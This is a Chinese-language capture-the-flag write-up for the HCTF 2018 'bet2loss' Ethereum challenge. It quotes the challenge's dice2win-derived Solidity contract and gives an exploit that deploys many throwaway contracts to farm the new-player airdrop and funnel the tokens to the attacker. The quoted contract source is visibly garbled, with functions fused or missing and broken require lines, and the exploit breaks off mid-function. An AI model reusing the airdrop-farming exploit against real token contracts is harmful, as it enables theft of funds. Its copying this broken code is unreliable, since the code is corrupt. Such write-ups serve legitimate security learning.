    4、Example: set 2 as modulo, guess 1, and bet 100 B2GB. if 1 == random_number%modulo, you will get 100*2, which is 200 B2GB.
    5、Ahhhh, if balanceOf(you) > 10000000, you can use the function PayForFlag. Admin will post the flag to your email.
    ps: you need install a eth wallet, just like metamask in chrome webstore and a little test eth for gasprice.
    ps: you can get the test eth from every ether faucet.(just like https://faucet.metamask.io/)
这个页面里面可以下注，进行游戏（ps: 一看参数就知道是参考dice2win这个游戏）  
每个新玩家空投1000 B2GB。目标`balanceOf(you) > 10000000`，然后调用`PayForFlag`。
接下来就是找漏洞点了。
直接去区块链浏览器中看智能合约源码。（顺带吐槽下，为啥区块链的题目部署到同一个测试网络中，这样不是直接可以看别的队伍的payload么）。  
源码如下
    pragma solidity ^0.4.24;
    // Wow. Welcome to hctf2018
    library SafeMath {
      function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
          return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
      }
      function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0); 
        uint256 c = a / b;
        return c;
      }
      function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b = a);
        return c;
      }
    }
    contract ERC20{
      using SafeMath for uint256;
      mapping (address => uint256) public balances;
      uint256 public _totalSupply;
      function totalSupply() public view returns (uint256) {
        return _totalSupply;
      }
      function balanceOf(address owner) public view returns (uint256) {
        return balances[owner];
      }
      function transfer(address _to, uint _value) public returns (bool success){
          balances[msg.sender] = balances[msg.sender].sub(_value);
          balances[_to] = balances[_to].add(_value);
          return true;
        }
    }
    contract B2GBToken is ERC20 {
      string public constant name = "test";
      string public constant symbol = "test";
      uint8 public constant decimals = 18;
      uint256 public constant _airdropAmount = 1000;
      uint256 public constant INITIAL_SUPPLY = 20000000000 * (10 ** uint256(decimals));
      mapping(address => bool) initialized;
      constructor() public {
        initialized[msg.sender] = true;
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
      }
      // airdrop
      function AirdropCheck() internal returns (bool success){
         if (!initialized[msg.sender]) {
                initialized[msg.sender] = true;
                balances[msg.sender] = _airdropAmount;
                _totalSupply += _airdropAmount;
            }
            return true;
      }
    }
    contract Bet2Loss is B2GBToken{
        uint constant MIN_JACKPOT_BET = 0.1 ether;
        uint constant MIN_BET = 1;
        uint constant MAX_BET = 100000;
        uint constant MAX_MODULO = 100;
        uint constant BET_EXPIRATION_BLOCKS = 250;
        address constant DUMMY_ADDRESS = 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C;
        address public owner;
        address private nextOwner;
        uint public maxProfit;
        address public secretSigner;
        uint128 public jackpotSize;
        uint128 public lockedInBets;
        struct Bet {
            uint betnumber;
            uint8 modulo;
            uint40 placeBlockNumber;
            uint40 mask;
            address gambler;
        }
        mapping (uint => Bet) bets;
        event FailedPayment(address indexed beneficiary, uint amount);
        event Payment(address indexed beneficiary, uint amount);
        event Commit(uint commit);
        event GetFlag(
          string b64email,
          string back
        );
        constructor () public {
            owner = msg.sender;
            secretSigner = DUMMY_ADDRESS;
        }
        modifier onlyOwner {
            require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
            _;
        }
        function setSecretSigner(address newSecretSigner) external onlyOwner {
            secretSigner = newSecretSigner;
        }
        function placeBet(uint betMask, uint modulo, uint betnumber, uint commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v) external payable {
            // airdrop
            AirdropCheck();
            Bet storage bet = bets[commit];
            require (bet.gambler == address(0), "Bet should be in a 'clean' state.");
            require (balances[msg.sender] >= betnumber, "no more balances");
            require (modulo > 1 && modulo = 0 && betMask  0 && betnumber  placeBlockNumber, "settleBet in the same block as placeBet, or before.");
            require (block.number  10000000);
          emit GetFlag(b64email, "Get flag!");
        }
    }
空投，自然想到薅羊毛。
这个代码很容易看出是从dice2win改过来的，有的参数都没有删干净。  
可以参考[](http://blogs.360.cn/post/Fairness_Analysis_of_Dice2win.html)里面的一些介绍。  
dice2win主要的流程如下
    1.【庄家承诺】庄家(secretSigner)随机生成某随机数reveal，同时计算commit = keccak256 (reveal)对该reveal进行承诺。然后根据目前区块高度，设置一个该承诺使用的最后区块高度commitLastBlock。 对commitLastBlock和commit的组合体进行签名得到sig，同时把(commit, commitLastBlock,sig)发送给玩家。
    2. 【玩家下注】玩家获得(commit, commitLastBlock,sig)后选择具体要玩的游戏，猜测一个随机数r，发送下注交易placeBet到智能合约上进行下注。
    3. 【矿工打包】下注交易被以太坊矿工打包到区块block1中，并将玩家下注内容存储到合约存储空间中。
    4.【庄家开奖】当庄家在区块block1中看到玩家的下注信息后。则发送settleBet交易公开承诺值reveal到区块链上。合约计算随机数random_number=keccak256(reveal,block1.hash)。如果random_number满足用户下注条件，则用户胜，否则庄家胜。此外游戏还设有大奖机制，即如果某次random_number满足某个特殊值(如88888)，则用户可赢得奖金池中的大奖。
可以简单地说，调用placeBet下注，调用settleBet开奖。
可以看一下我们可以调用哪些函数，直接把源码复制到remix中，部署一下  
在右下角，我们可以看到可以调用的函数。  
PayForFlag函数用来证明自己完成任务，让后台发flag的证明  
placeBet函数下注  
settleBet函数结算  
setSecretSigner函数设置签名者，只有owner可以调用。（如果commit-reveal机制）  
transfer 函数，直接可以从msg.sender账户中向特定地址转账。
简单可以想到，可以创建一个合约，调用这个合约的函数，创建多个临时合约（这里临时指的是，我们临时用一用，用完就不理它了），然后这些临时合约将钱转给某个特定的地址，那么就可以积少成多，达到题目的要求。
回头看看空投在哪里触发，`AirdropCheck()`检查该用户是否新用户，如果是，则空投1000 B2GB。  
在placeBet函数和settleBet函数中都有调用。  
直接上EXP
    pragma solidity ^0.4.24;
    // Wow. Welcome to hctf2018
    import "browser/bet2loss.sol";
    contract KongTouBot{
        constructor(address victim, address attack) public payable{
           Bet2Loss victimContract = Bet2Loss(victim);
           victimContract.settleBet(47080097);
           victimContract.transfer(attack, 900);
        }
        function kill() public{
            selfdestruct(0xdea21565e077aa6b5864446e1624f553dc158603);
        }
    }
    contract Bet2LossEXP{
        constructor() public {
            for(var i=0; i < 50; i++){
                KongTouBot tmp = new KongTouBot(0x006b9bc418e43e92cf8d380c56b8d4be41fda319,msg.sender);
                //tmp.kill();
            }
            //selfdestruct(msg.sender);
        }
        function attack(uint num) public {
            for(var i=0; i < num; i++){